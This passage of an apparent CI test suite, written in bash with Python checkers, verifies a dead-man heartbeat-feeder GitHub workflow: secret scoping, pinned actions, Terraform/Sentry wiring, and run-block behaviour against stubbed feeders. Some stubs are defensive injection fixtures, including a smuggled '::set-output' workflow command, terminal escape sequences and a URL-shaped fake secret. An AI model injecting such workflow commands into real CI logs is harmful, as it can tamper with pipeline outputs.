job = list(jobs.values())[0] if jobs else {}
need("environment" not in job, "declares-environment")
need("env" not in job, "job-level-env")
need(job.get("timeout-minutes") == 6, "timeout-minutes-not-6")
need(job.get("runs-on") == "ubuntu-24.04", "runs-on")
steps = job.get("steps") or []
co = [s for s in steps if "actions/checkout" in str(s.get("uses", ""))]
need(len(co) == 1 and co[0]["uses"] == "actions/checkout@34e114876b0b11c390a56381ad16ebd13914f8d5 # v4.3.1".split(" #")[0] and (co[0].get("with") or {}).get("persist-credentials") is False, "checkout-pin-or-persist-credentials")
fs = [s for s in steps if s.get("id") == "feeder"]
need(len(fs) == 1, "feeder-step-count")
fstep = fs[0] if fs else {}
need("continue-on-error" not in fstep and "if" not in fstep, "feeder-step-skippable")
need(fstep.get("env") == {
    "BETTERSTACK_QUERY_HOST": "${{ secrets.BETTERSTACK_QUERY_HOST }}",
    "BETTERSTACK_QUERY_USERNAME": "${{ secrets.BETTERSTACK_QUERY_USERNAME }}",
    "BETTERSTACK_QUERY_PASSWORD": "${{ secrets.BETTERSTACK_QUERY_PASSWORD }}",
    "BETTERSTACK_API_TOKEN_READONLY": "${{ secrets.BETTERSTACK_API_TOKEN_READONLY }}",
}, "feeder-step-env-not-exactly-the-four-secrets")
for s in steps:
    if s is not fstep:
        need(not any(k in (s.get("env") or {}) for k in ("BETTERSTACK_QUERY_HOST", "BETTERSTACK_QUERY_USERNAME", "BETTERSTACK_QUERY_PASSWORD", "BETTERSTACK_API_TOKEN_READONLY")), "credential-env-outside-feeder-step")
        # By VALUE, under any key name: a BETTERSTACK_* secret handed to another step as a `with:` input or an
        # env var of another name is the same disclosure.
        need("secrets.BETTERSTACK" not in repr(s), "betterstack-secret-outside-feeder-step")
need(len(re.findall(r"secrets\.BETTERSTACK_", re.sub(r"(?m)^\s*#.*$", "", text))) == 4, "betterstack-secret-reference-count-not-4")
run = fstep.get("run", "")
need("${{" not in run, "expression-inside-run-block")
# The step never makes a request of its own: every network call belongs to the feeder script.
need(re.search(r"\bcurl\b", re.sub(r"(?m)#.*$", "", run)) is None, "curl-in-run-block")
loops = re.findall(r"for t in ([a-z -]+); do", run)
need(len(loops) == 1, "target-loop-count")
need(loops and loops[0].split() == sorted(loops[0].split(), key=lambda x: loops[0].split().index(x)) and set(loops[0].split()) == set(re.search(r'^TARGETS="(.*)"$', open(feeder).read(), re.M).group(1).split()), "loop-targets-differ-from-script-table")
need(bool(re.search(r'out="\$\(bash scripts/deadman-heartbeat-feeder\.sh "\$t" 2>&1\)" \|\| rc=\$\?', run)), "rc-capture")
need(len(re.findall(r"^\s*bash scripts/deadman-heartbeat-feeder\.sh|bash scripts/deadman-heartbeat-feeder\.sh", run)) == 1, "invocation-count")
need("break" not in re.sub(r"#.*", "", run), "loop-breaks-on-failure")
need("all_decided=" in run and "GITHUB_OUTPUT" in run, "all_decided-output")
need("UNARMED (paused)" in run and "::warning::" in run, "unarmed-warning")
need("no page can fire" not in run, "unarmed-claims-no-page")
need("strip_log_injection()" in run, "strip_log_injection")
sent = steps[-1] if steps else {}
need(sent.get("uses") == "./.github/actions/sentry-heartbeat" and (sent.get("with") or {}).get("monitor-slug") == "scheduled-deadman-heartbeat-feeder", "sentry-step")
need(sent.get("if") == "always()" and sent.get("continue-on-error") is True, "sentry-step-if-always")
need((sent.get("with") or {}).get("status") == "${{ steps.feeder.outputs.all_decided == 'true' && 'ok' || 'error' }}", "sentry-status-expression")
for tok in ("DOPPLER_TOKEN", "HCLOUD_TOKEN"):
    need(tok not in re.sub(r"(?m)^\s*#.*$", "", text), "names-" + tok)
need(re.search(r"gate-override: new-scheduled-cron-prefer-inngest", text) is not None, "gate-override-header")
for u in [s.get("uses", "") for s in steps if s.get("uses")]:
    need(u.startswith("./") or re.search(r"@[0-9a-f]{40}$", u) is not None, "unpinned-action")
print("\n".join(bad))
PYW
}
cases=$((cases + 1))
if [[ -f "$WORKFLOW" ]]; then
  _wv="$(workflow_violations "$WORKFLOW" 2>&1)"
  if [[ -z "$_wv" ]]; then pass "workflow: triggers, concurrency, permissions, pins, step env, loop = script table, Sentry status, Tier A"
  else fail "workflow violations: $(paste -sd, - <<<"$_wv")"; fi
else fail "workflow file missing: $WORKFLOW"; fi
cases=$((cases + 1))
if [[ "$(grep -cE '^[^#]*bash scripts/deadman-heartbeat-feeder\.sh' "$WORKFLOW" 2>/dev/null || true)" == 1 ]]; then pass "the manifest evidence pattern appears once, on the run line"
else fail "the evidence pattern must appear exactly once outside comments"; fi

echo "== workflow step behaviour (the real run: block against a stubbed feeder) =="
WF_RUN="$WORK/wf.run.sh"
"$PY" -I - "$WORKFLOW" "$WF_RUN" <<'PY'
import sys, yaml
wf = yaml.safe_load(open(sys.argv[1]))
step = [s for s in wf["jobs"][list(wf["jobs"])[0]]["steps"] if s.get("id") == "feeder"][0]
open(sys.argv[2], "w").write(step["run"])
PY
wf_run() { # <stub body> [VAR=val ...] -> WF_RC; $d/out.txt and $d/log.txt hold the outputs and the log
  local d="$WORK/wf" body="$1"; shift
  assert_fixture_dir "$d"
  case "$d" in "$WORK"/wf) rm -rf -- "$d" ;; *) echo "FATAL: wf dir" >&2; exit 2 ;; esac
  mkdir -p "$d/scripts"
  if [[ "$body" != "__missing__" ]]; then printf '%s\n' "$body" > "$d/scripts/deadman-heartbeat-feeder.sh"; fi
  : > "$d/out.txt"
  WF_RC=0
  ( cd "$d" && env -i PATH="$PATH" HOME="$HOME" GITHUB_OUTPUT="$d/out.txt" "$@" "$BASH_BIN" --noprofile --norc -eo pipefail "${WF_RUN_OVERRIDE:-$WF_RUN}" > "$d/log.txt" 2>&1 ) || WF_RC=$?
}
# A negative-only check ("this text is NOT in the log") also passes when the run block never ran at all. Its
# positive companion: the block completed (rc 0), wrote its all_decided line, and decided nothing (false).
p_ran_undecided() { [[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt"; }
wf_check() { # <name> <cond-description> <exit-status-of-condition>
  cases=$((cases + 1))
  if [[ "$3" == 0 ]]; then pass "$1: $2"; else fail "$1: $2"; sed 's/^/        | /' "$WORK/wf/log.txt" >&2; fi
}
# Control of wf_check: a false condition must be ONE failure carrying the check's description.
wf_drv_false() { wf_check "CTL-WF" "a condition that is false" 1; }
wf_drv_empty() { wf_check "CTL-WF" "an empty condition status" ""; }
own_ctl "wf_check() fails on a false condition" "CTL-WF: a condition that is false" wf_drv_false
own_ctl "wf_check() fails on an empty status (a predicate that printed nothing)" "CTL-WF: an empty condition status" wf_drv_empty
# wf_mut: apply an exact-once edit to the extracted run block and run it with the SAME stub and predicate as
# the real row; the mutant must complete (rc 0 and an all_decided line) AND break the predicate.
wf_mut_file() { # <row> <old> <new> -> prints the mutated run-block path, or fails
  "$PY" -I - "$WF_RUN" "$WORK/wf.mut.$1.sh" "$2" "$3" <<'PYX' >/dev/null || return 3
import sys
s = open(sys.argv[1]).read()
if s.count(sys.argv[3]) != 1:
    sys.stderr.write("wf_mut: %d occurrences\n" % s.count(sys.argv[3]))
    sys.exit(3)
open(sys.argv[2], "w").write(s.replace(sys.argv[3], sys.argv[4]))
PYX
  printf '%s' "$WORK/wf.mut.$1.sh"
}
wf_mut_red() { # <row> <desc> <predicate-status-of-the-mutant-run>
  cases=$((cases + 1))
  if ! [[ "$WF_RC" == 0 ]] || ! grep -q '^all_decided=' "$WORK/wf/out.txt"; then
    fail "mutation row $1 ($2) went red for another reason: the mutant run block did not complete (rc $WF_RC)"
  elif [[ "$3" == 0 ]]; then fail "mutation row $1 ($2) SURVIVED: the real predicate still holds on the mutant"
  else pass "mutation row $1 ($2) is RED as predicted: the run completed and the predicate broke"; fi
}
wfmut_drv_survivor() { wf_run "$STUB_LUKS_DARK"; wf_mut_red CTL-WFM "known survivor" "$(p_luks_dark; echo $?)"; }
wfmut_drv_wrongreason() { printf 'if\n' > "$WORK/wf.mut.broken.sh"; WF_RUN_OVERRIDE="$WORK/wf.mut.broken.sh" wf_run "$STUB_LUKS_DARK"; wf_mut_red CTL-WFM "known wrong reason" 1; }
GOOD='case "$1" in
  luks-monitor-host-timer) printf "deadman-feeder: target=luks-monitor-host-timer verdict=beat n=1 newest_dt=2026-10-30_00:04:56.747448\n"; echo "fed: noise line"; exit 0 ;;
  claude-cost-capture) printf "deadman-feeder: target=claude-cost-capture verdict=beat n=4\n"; exit 0 ;;
esac'
wf_run "$GOOD"
wf_check "workflow step, both beat" "exits 0, all_decided=true, only marker lines echoed, no UNARMED warning" "$([[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=true' "$WORK/wf/out.txt" && grep -q 'verdict=beat n=1' "$WORK/wf/log.txt" && grep -q 'verdict=beat n=4' "$WORK/wf/log.txt" && ! grep -q 'fed: noise' "$WORK/wf/log.txt" && ! grep -q 'UNARMED' "$WORK/wf/log.txt"; echo $?)"
# Predicates over the last wf_run, shared by the real rows and the behaviour mutants below.
p_unarmed() { [[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=true' "$WORK/wf/out.txt" \
  && [[ "$(grep -c '^::warning::deadman heartbeat .* is UNARMED (paused)$' "$WORK/wf/log.txt")" == 2 ]] \
  && ! grep -q 'no page can fire' "$WORK/wf/log.txt" \
  && [[ "$(grep -c 'UNARMED (paused)' "$WORK/wf/summary.txt" 2>/dev/null)" == 2 ]]; }
p_luks_dark() { [[ "$WF_RC" == 0 ]] && grep -qx '::error::deadman luks-monitor-host-timer: HOST/SOURCE DARK (no_qualifying_row)' "$WORK/wf/log.txt" && ! grep -q 'FEEDER FAULT' "$WORK/wf/log.txt"; }
p_cost_dark() { [[ "$WF_RC" == 0 ]] && grep -qx '::error::deadman claude-cost-capture: SOURCE DARK (no_qualifying_row); the cause is not established' "$WORK/wf/log.txt" \
  && ! grep -q 'HOST/SOURCE DARK' "$WORK/wf/log.txt" && ! grep -q 'FEEDER FAULT' "$WORK/wf/log.txt"; }
p_fault_reason() { [[ "$WF_RC" == 0 ]] && grep -qx '::error::deadman luks-monitor-host-timer: FEEDER FAULT (query_failed reason=helper_status); says nothing about the host' "$WORK/wf/log.txt" \
  && ! grep -q 'DARK' "$WORK/wf/log.txt"; }
STUB_PAUSED='printf "deadman-feeder: target=$1 verdict=qualifying_row_heartbeat_paused n=1\n"; exit 0'
STUB_LUKS_DARK='case "$1" in luks-monitor-host-timer) printf "deadman-feeder: target=luks-monitor-host-timer verdict=no_qualifying_row n=0 newest_dt=none any_rows=0 fail_rows=0\nCANNOT BEAT: the nightly row is absent\n"; exit 3 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=2\n"; exit 0 ;; esac'
STUB_COST_DARK='case "$1" in claude-cost-capture) printf "deadman-feeder: target=claude-cost-capture verdict=no_qualifying_row n=0 newest_dt=none\n"; exit 3 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=2\n"; exit 0 ;; esac'
STUB_FAULT='case "$1" in luks-monitor-host-timer) printf "deadman-feeder: target=luks-monitor-host-timer verdict=query_failed reason=helper_status status=7 class=auth body_len=12\n"; exit 3 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=2\n"; exit 0 ;; esac'
wf_run "$STUB_PAUSED" "GITHUB_STEP_SUMMARY=$WORK/wf/summary.txt"
wf_check "workflow step, both paused" "all_decided=true; one UNARMED warning and one step-summary line per target, every run; the log does not claim that no page can fire" "$(p_unarmed; echo $?)"
wf_run "$STUB_LUKS_DARK"
wf_check "workflow step, first target withheld" "the second target still runs (no break), all_decided=false, the luks page names HOST/SOURCE DARK and nothing else" "$([[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" && grep -q 'verdict=beat n=2' "$WORK/wf/log.txt" && p_luks_dark; echo $?)"
wf_run "$STUB_COST_DARK"
wf_check "workflow step, cost target withheld" "the cost page says SOURCE DARK with the cause not established, never that the host is dark" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt" && p_cost_dark; echo $?)"
wf_run "$STUB_FAULT"
wf_check "workflow step, a query fault" "annotated FEEDER FAULT with the reason token, saying nothing about the host, never DARK" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt" && p_fault_reason; echo $?)"
wf_run 'exit 3'
wf_check "workflow step, a silent exit 3" "no marker at all is a FEEDER FAULT (no_marker), never DARK" "$(grep -q '^::error::deadman luks-monitor-host-timer: FEEDER FAULT (no_marker); says nothing about the host$' "$WORK/wf/log.txt" && ! grep -q 'DARK' "$WORK/wf/log.txt"; echo $?)"
wf_run 'case "$1" in claude-cost-capture) printf "deadman-feeder: target=claude-cost-capture verdict=beat_failed reason=http_status\n"; exit 4 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=2\n"; exit 0 ;; esac'
wf_check "workflow step, second target beat_failed" "all_decided=false and a FEEDER FAULT that carries the reason and keeps the qualifying-row fact" "$([[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" && grep -q '^::error::deadman claude-cost-capture: FEEDER FAULT (beat_failed reason=http_status); says nothing about the host: a qualifying row existed' "$WORK/wf/log.txt"; echo $?)"
STUB_STALE='printf "deadman-feeder: target=$1 verdict=query_failed reason=helper_status\ndeadman-feeder: target=$1 verdict=trap_remapped rc=5\n"; exit 3'
# A reason belongs to ONE marker: a later verdict-bearing marker without its own reason must not inherit it.
p_stale() { [[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" \
  && [[ "$(grep -cE '^::error::deadman (luks-monitor-host-timer|claude-cost-capture): FEEDER FAULT \(trap_remapped\); says nothing about the host$' "$WORK/wf/log.txt")" == 2 ]] \
  && ! grep -q 'trap_remapped reason' "$WORK/wf/log.txt"; }
wf_run "$STUB_STALE"
wf_check "workflow step, two markers" "a reason from an earlier marker does not ride onto the later trap_remapped verdict (both targets)" "$(p_stale; echo $?)"
wf_run 'printf "::set-output name=x::y\n"; printf "deadman-feeder: target=$1 verdict=no_qualifying_row n=0\n"; exit 3'
wf_check "workflow step, command injection" "a feeder line that starts with :: never reaches the log as a command" "$(! grep -q '^::set-output' "$WORK/wf/log.txt" && p_ran_undecided && grep -qx 'deadman-feeder: target=luks-monitor-host-timer verdict=no_qualifying_row n=0' "$WORK/wf/log.txt"; echo $?)"
wf_run 'printf "deadman-feeder: target=$1 verdict=beat \033[31mred\033[0m\n"; exit 0'
wf_check "workflow step, control characters" "an escape sequence is stripped; a line that then fails the marker shape is counted, not printed" "$(! LC_ALL=C grep -q $'\033' "$WORK/wf/log.txt" && p_ran_undecided && grep -q 'dropped_lines=1' "$WORK/wf/log.txt"; echo $?)"
wf_run 'printf "deadman-feeder: target=$1 verdict=beat url=https://uptime.betterstack.com/api/v1/heartbeat/SYNTHsecret\n"; exit 0'
wf_check "workflow step, shape discipline" "a marker carrying a URL-shaped value fails the shape and is NOT printed" "$(! grep -q 'SYNTHsecret' "$WORK/wf/log.txt" && p_ran_undecided && grep -q 'dropped_lines=1' "$WORK/wf/log.txt"; echo $?)"
wf_run 'printf "deadman-feeder: target=$1 verdict=weird\n"; exit 0'
wf_check "workflow step, exit 0 without a deciding verdict" "all_decided=false (Sentry error), never ok" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt"; echo $?)"
wf_run 'case "$1" in luks-monitor-host-timer) exit 0 ;; *) printf "deadman-feeder: target=$1 verdict=beat n=1\n"; exit 0 ;; esac'
wf_check "workflow step, silent exit 0" "a feeder that exits 0 with no marker is NOT a decision: all_decided=false" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt"; echo $?)"
wf_run 'printf "deadman-feeder: target=other-target verdict=beat n=1\n"; exit 0'
wf_check "workflow step, wrong target in the marker" "a marker naming another target does not decide this one: all_decided=false" "$(grep -qx 'all_decided=false' "$WORK/wf/out.txt"; echo $?)"
wf_run __missing__
wf_check "workflow step, feeder missing" "step exits 0, all_decided=false, the cause is named" "$([[ "$WF_RC" == 0 ]] && grep -qx 'all_decided=false' "$WORK/wf/out.txt" && grep -q 'no_marker' "$WORK/wf/log.txt"; echo $?)"
sed -E '/^ *break$/d' "$WF_RUN" > "$WORK/wf.same.sh"
cases=$((cases + 1))
if cmp -s "$WF_RUN" "$WORK/wf.same.sh"; then pass "the run block contains no bare break line"; else fail "the run block contains a bare break"; fi

echo "== Guard 2: predicate fidelity with the emitters =="
guard2_checks() { # <feeder> <luks-monitor.sh> [vector.toml] [server.tf] -> "OK ..." / "FAIL ..." lines
  "$PY" -I - "$1" "$2" "$EMIT_LUKS_UNIT" "${3:-$EMIT_VECTOR}" "${4:-$EMIT_SERVER_TF}" "$EMIT_MARKER" "$EMIT_SUBSTRATE" "$EMIT_PROBE" <<'PYG'
import re, sys
feeder, luks, unit, vector, servertf, marker_ts, substrate_ts, probe_ts = [open(p, encoding="utf-8").read() for p in sys.argv[1:9]]
out = []
def check(c, m): out.append(("OK " if c else "FAIL ") + m)
def pred(name):
    m = re.search(r"def_pred " + name + r" <<'EOF'\n(.*?)\nEOF", feeder, re.S)
    return m.group(1).strip() if m else None
lp, cp = pred("LUKS_PRED"), pred("COST_PRED")
check(lp is not None and cp is not None, "both predicates are extractable from the feeder (anti-vacuity)")
lp, cp = lp or "", cp or ""
check(len(re.findall(r" AND ", lp)) == 3 and len(re.findall(r"JSONExtractString\(raw, '", lp)) == 4, "luks: exactly four AND-joined field conjuncts (anti-vacuity floor)")
check(" OR " not in lp, "luks: no OR (the unit conjunct cannot be bypassed)")
# --- luks: the needle is a substring of the OK line the script logs, and the other literals match their writers
okline = re.search(r'^log "(OK: /mnt/data is LUKS-backed)\b', luks, re.M)
needle = re.search(r"LIKE '%(OK: /mnt/data is LUKS-backed[^%']*)%'", lp)
check(okline is not None and needle is not None and needle.group(1) == okline.group(1), "luks: the LIKE needle equals the OK line luks-monitor.sh logs (%r vs %r)" % (needle and needle.group(1), okline and okline.group(1)))
tag = re.search(r'^LOG_TAG="([^"]+)"', luks, re.M)
ident = re.search(r"JSONExtractString\(raw, 'SYSLOG_IDENTIFIER'\) = '([^']+)'", lp)
check(tag is not None and ident is not None and tag.group(1) == ident.group(1), "luks: SYSLOG_IDENTIFIER equals luks-monitor.sh's LOG_TAG")
sid = re.search(r"^SyslogIdentifier=(\S+)", unit, re.M)
check(sid is not None and ident is not None and sid.group(1) == ident.group(1), "luks: SYSLOG_IDENTIFIER equals the unit's SyslogIdentifier")
unitq = re.search(r"JSONExtractString\(raw, '_SYSTEMD_UNIT'\) = '([^']+)'", lp)
check(unitq is not None and unitq.group(1) == "luks-monitor.service" and "[Service]" in unit, "luks: _SYSTEMD_UNIT is the unit this repo ships (luks-monitor.service)")
def section(text, header):
    m = re.search(r"(?m)^\[" + re.escape(header) + r"\]\n(.*?)(?=^\[|\Z)", text, re.S)
    return m.group(1) if m else ""
# Scoped to the block that owns the fact: the same `.host_name` line also sits in tag_metrics, and the same
# "luks-monitor" tag in two other sources, so an unscoped search stays green when the journald copy is lost.
tj = section(vector, "transforms.tag_journald")
check(re.search(r'(?m)^\s*\.host_name = "@@HOST_NAME@@"\s*$', tj) is not None, "luks: host_name is written by vector.toml's [transforms.tag_journald] (@@HOST_NAME@@)")
hn = re.search(r"JSONExtractString\(raw, 'host_name'\) = '([^']+)'", lp)
check(hn is not None and re.search(r'(?m)^\s*host_name\s*=\s*each\.key == "web-1" \? "' + re.escape(hn.group(1)) + '"', servertf) is not None, "luks: host_name literal is web-1's host_name value in server.tf (the line the vector render is fed from)")
hs = "\n".join(l for l in section(vector, "sources.host_scripts_journald").split("\n") if not l.lstrip().startswith("#"))
check(re.search(r"(?m)^include_matches\.SYSLOG_IDENTIFIER\s*=\s*\[", hs) is not None and re.search(r'(?m)^\s*"luks-monitor",?\s*$', hs) is not None, "luks: the tag is in vector.toml's [sources.host_scripts_journald] allowlist")
# --- cost: exactly two arms; literals pinned to their TS emitters
check(len(re.findall(r"\bOR\b", cp)) == 1, "cost: exactly one OR, joining the marker arm and the credit-probe arm")
check("raw LIKE '%\"SOLEUR_CLAUDE_COST\":true%'" in cp and "'Nullable(Float64)') IS NOT NULL" in cp, "cost: the marker arm keeps the key match and the non-null cost_usd")
check("JSONExtractString(raw, 'message', 'source') LIKE 'cron:%'" in cp, "cost: the marker arm keeps source LIKE 'cron:%'")
check("JSONExtractString(raw, 'message', 'component') = 'claude-cost'" in cp, "cost: the marker arm keeps component = 'claude-cost'")
cron = re.search(r'^const CRON_NAME = "([a-z0-9-]+)";', probe_ts, re.M)
armb = re.search(r"OR \(JSONExtractString\(raw, 'message', 'feature'\) = '([^']*)' AND JSONExtractString\(raw, 'message', 'op'\) IN \(([^)]*)\)\)", cp)
ops_sql = set(re.findall(r"'([^']*)'", armb.group(2))) if armb else set()
opu = re.search(r"op\?:\s*([^;]+);", probe_ts)
ops_ts = set(re.findall(r'"(anthropic-[a-z-]+)"', opu.group(1))) if opu else set()
check(cron is not None and armb is not None and armb.group(1) == cron.group(1), "cost: arm B's feature literal is the credit probe's CRON_NAME (%s)" % (cron and cron.group(1)))
check(bool(ops_sql) and bool(ops_ts) and ops_sql <= ops_ts, "cost: arm B's ops are members of the probe's op union (sql=%s ts=%s)" % (sorted(ops_sql), sorted(ops_ts)))
check(re.search(r'pino\(\{ base: \{ component: "claude-cost" \} \}\)', marker_ts) is not None, "cost: component 'claude-cost' is the marker logger's pino base")
check(re.search(r"log\.warn\(\{ SOLEUR_CLAUDE_COST: true, \.\.\.m \}", marker_ts) is not None, "cost: the marker writes the SOLEUR_CLAUDE_COST: true key")
check("source: `cron:${cronName}`" in substrate_ts, "cost: the substrate writes source `cron:${cronName}`")
print("\n".join(out))
PYG
}
_g2="$(guard2_checks "$FEEDER_SRC" "$EMIT_LUKS" 2>&1)"
while IFS= read -r _l; do
  [[ -n "$_l" ]] || continue
  cases=$((cases + 1))
  case "$_l" in OK\ *) pass "${_l#OK }" ;; *) fail "${_l#FAIL }" ;; esac
done <<<"$_g2"
cases=$((cases + 1))
if [[ "$(grep -c '^OK ' <<<"$_g2")" == 19 && "$(grep -c '^FAIL' <<<"$_g2" || true)" == 0 ]]; then pass "Guard 2: exactly 19 emitter pins hold (a crashing checker would print fewer)"
else fail "Guard 2: emitter pins incomplete or failing ($(grep -c '^OK ' <<<"$_g2") OK)"; fi
# the frozen-set identity: each target's predicate in the script equals the suite's independent expected text
cases=$((cases + 1))
_gp="$("$PY" -I - "$FEEDER_SRC" "${E_PRED[$T_LUKS]}" "${E_PRED[$T_COST]}" <<'PYF'
import re, sys
s = open(sys.argv[1]).read()
def pred(name):
    m = re.search(r"def_pred " + name + r" <<'EOF'\n(.*?)\nEOF", s, re.S)
    return m.group(1).strip() if m else None
print("ok" if pred("LUKS_PRED") == sys.argv[2] and pred("COST_PRED") == sys.argv[3] else "differs")
PYF
)"
if [[ "$_gp" == ok ]]; then pass "both predicates equal the suite's frozen expected text"
else fail "a predicate differs from the frozen expected text"; fi

echo "== Guard 4: wiring parity across the surfaces that must agree =="
wiring_violations() { # <uptime_tf> <apply_yml> <table_ts> <feeder> <monitors_tf> -> one line per violated pin
  "$PY" -I - "$1" "$2" "$3" "$4" "$5" "$WORKFLOW" "$ALERTS_TF" "${EXPECT_TARGETS// /,}" <<'PYW'
import re, sys
import yaml
tfp, applyp, tablep, feederp, monp, wfp, alertsp, targets = sys.argv[1:9]
tf, apply_, table, feeder, mon, wf, alerts = [open(p).read() for p in (tfp, applyp, tablep, feederp, monp, wfp, alertsp)]
bad = []
def need(c, m):
    if not c: bad.append(m)
tl = targets.split(",")
need(len(tl) >= 1, "no-targets")
names = {}
for t in tl:
    m = re.search(r'select_target\(\) \{.*?\n\s*' + re.escape(t) + r'\)(.*?);;', feeder, re.S)
    nm = re.search(r'NAME="([^"]+)"', m.group(1)) if m else None
    names[t] = nm.group(1) if nm else None
    need(names[t] is not None, "script-name-missing-" + t)
blocks = dict((m.group(1), m.group(2)) for m in re.finditer(r'^resource "betteruptime_heartbeat" "([a-z0-9_]+)" \{\n(.*?)^\}', tf, re.S | re.M))
need(len(blocks) >= 1, "no-heartbeat-blocks-discovered")
want_res = {"luks-monitor-host-timer": "luks_monitor_host_timer", "claude-cost-capture": "claude_cost_capture"}
for t in tl:
    res = want_res[t]
    b = blocks.get(res, "")
    need(b != "", "tf-resource-missing-" + res)
    need(re.search(r'^\s*name\s*=\s*"' + re.escape(names[t] or "?") + '"', b, re.M) is not None, "tf-name-differs-from-script-" + res)
    need(re.search(r'^\s*period\s*=\s*3600\s*$', b, re.M) is not None, "tf-period-" + res)
    need(re.search(r'^\s*grace\s*=\s*7200\s*$', b, re.M) is not None, "tf-grace-" + res)
    need(re.search(r'^\s*paused\s*=\s*true\s*$', b, re.M) is not None, "tf-paused-" + res)
    need(re.search(r'ignore_changes\s*=\s*\[\s*paused\s*\]', b) is not None, "tf-ignore_changes-" + res)
    need("betterstack_paid_tier" in b, "tf-policy-gate-" + res)
    # The notification route is part of what pages: a heartbeat that stops paging email/push would time out silently.
    need(re.search(r'^\s*email\s*=\s*true\s*$', b, re.M) is not None, "tf-email-" + res)
    need(re.search(r'^\s*push\s*=\s*true\s*$', b, re.M) is not None, "tf-push-" + res)
    need(re.search(r'^\s*call\s*=\s*false\s*$', b, re.M) is not None, "tf-call-" + res)
    need(re.search(r'^\s*sms\s*=\s*false\s*$', b, re.M) is not None, "tf-sms-" + res)
    need(re.search(r'^\s*team_wait\s*=\s*0\s*$', b, re.M) is not None, "tf-team_wait-" + res)
# The -target lines must sit in the PLAN step of the apply job (the saved plan the apply step runs) and nowhere in
# the second, SSH-provisioned apply step: a heartbeat that rides the second step is applied unplanned and ungraded.
awf = yaml.safe_load(apply_)
ajob = (awf.get("jobs") or {}).get("apply") or {}
asteps = ajob.get("steps") or []
plan_runs = [st.get("run", "") for st in asteps if st.get("id") == "plan"]
ssh_runs = [st.get("run", "") for st in asteps if str(st.get("name", "")).startswith("Terraform apply (SSH-provisioned")]
need(len(plan_runs) == 1 and len(ssh_runs) == 1, "apply-steps-not-discovered")
plan_run = plan_runs[0] if len(plan_runs) == 1 else ""
ssh_run = ssh_runs[0] if len(ssh_runs) == 1 else ""
for res in want_res.values():
    need(re.search(r'^\s*-target=betteruptime_heartbeat\.' + res + r'\b', plan_run, re.M) is not None, "apply-target-missing-" + res)
    need(re.search(r'-target=betteruptime_heartbeat\.' + res + r'\b', ssh_run) is None, "apply-target-in-ssh-step-" + res)
need(len(re.findall(r'-target[=\s]+["\']?logtail_exploration(_alert)?\.(claude_cost_capture_dark|luks_monitor_host_timer_dark)\b', "\n".join(l for l in plan_run.split("\n") if not l.lstrip().startswith("#")))) == 0, "apply-retired-destroy-targets-present")
need(re.search(r'-target=logtail_exploration', ssh_run) is None, "apply-destroy-target-in-ssh-step")
need(re.search(r'^\s*workflowFile: "scheduled-deadman-heartbeat-feeder\.yml",', table, re.M) is not None, "watchdog-row-workflowFile-line")
row = re.search(r'\{\s*workflowFile: "scheduled-deadman-heartbeat-feeder\.yml",(.*?)\n  \},', table, re.S)
need(row is not None and 'monitorSlug: "scheduled-deadman-heartbeat-feeder"' in row.group(1) and re.search(r'intervalMinutes: 60,', row.group(1)) is not None, "watchdog-row-fields")
need(row is not None and "11631" in row.group(1) and "second clause" in row.group(1), "watchdog-row-eligibility")
m = re.search(r'resource "sentry_cron_monitor" "scheduled_deadman_heartbeat_feeder" \{(.*?)\n\}', mon, re.S)
need(m is not None, "sentry-monitor-missing")
mb = m.group(1) if m else ""
need('name                    = "scheduled-deadman-heartbeat-feeder"' in mb, "sentry-monitor-name")
need(re.search(r'crontab = "0 \* \* \* \*"', mb) is not None, "sentry-monitor-crontab")
need(re.search(r'checkin_margin_minutes\s*=\s*60\b', mb) is not None, "sentry-monitor-margin-60")
need(re.search(r'max_runtime_minutes\s*=\s*6\b', mb) is not None, "sentry-monitor-max_runtime-6")
need(re.search(r'failure_issue_threshold\s*=\s*1\b', mb) is not None, "sentry-monitor-failure_issue_threshold-1")
need(re.search(r'recovery_threshold\s*=\s*1\b', mb) is not None, "sentry-monitor-recovery_threshold-1")
need(re.search(r'timezone\s*=\s*"UTC"', mb) is not None, "sentry-monitor-timezone-UTC")
need(re.search(r'^\s*scheduled_deadman_heartbeat_feeder\s*=\s*"[^"]*tracked on #11672', alerts, re.M) is not None, "sentry-unrouted-label")
need("sentry_cron_monitor.scheduled_deadman_heartbeat_feeder.id" not in re.sub(r"(?s)locals \{.*?\n\}\n", "", alerts, count=1), "sentry-monitor-routed-prematurely")
print("\n".join(bad))
PYW
}
cases=$((cases + 1))
_wire="$(wiring_violations "$UPTIME_TF" "$APPLY_WF" "$TABLE_TS" "$FEEDER_SRC" "$MONITORS_TF" 2>&1)"
if [[ -z "$_wire" ]]; then pass "wiring: script names = Terraform names/period/grace/paused/ignore_changes = apply targets; watchdog row; Sentry monitor + unrouted label"
else fail "wiring violations: $(paste -sd, - <<<"$_wire")"; fi
cases=$((cases + 1))
_man="$("$PY" -I - "$MANIFEST_TS" "$EXPECT_TARGETS" <<'PYM'
import re, sys
src = open(sys.argv[1]).read()
bad = []
for res in ("luks_monitor_host_timer", "claude_cost_capture"):
    m = re.search(r'\{\s*name: "' + res + r'",(.*?)\n  \},\n', src, re.S)
    if not m:
        bad.append("manifest-row-missing-" + res); continue
    b = m.group(1)
    if 'arming: "external-probe"' not in b: bad.append("manifest-arming-" + res)
    if "paused: true" not in b: bad.append("manifest-paused-" + res)
    if 'file: ".github/workflows/scheduled-deadman-heartbeat-feeder.yml"' not in b: bad.append("manifest-evidence-file-" + res)
    if 'pattern: "bash scripts/deadman-heartbeat-feeder.sh"' not in b: bad.append("manifest-evidence-pattern-" + res)
    if 'arming_pending: { tracking_issue: 11631, expires: "2026-11-13" }' not in b: bad.append("manifest-arming_pending-" + res)
print("\n".join(bad))
PYM
)"
